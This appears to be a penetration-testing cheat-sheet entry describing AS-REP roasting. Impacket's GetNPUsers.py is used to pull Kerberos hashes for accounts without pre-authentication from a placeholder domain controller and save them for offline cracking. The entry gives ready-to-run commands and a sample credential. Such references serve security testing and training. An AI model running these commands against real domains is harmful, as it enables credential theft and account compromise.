---
title: |
  Harvest non-preauth AS_REP responses for a given list of usernames
description: |
  Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username List: usernames.txt

  	Output File: hashes.txt

  Other command:

  	python3 GetNPUsers.py test.local/test:Welkom01! -request -dc-ip 10.10.10.1 -format hashcat -outputfile hashes

command: |
  python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes
items:
  - Username
  - Password
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
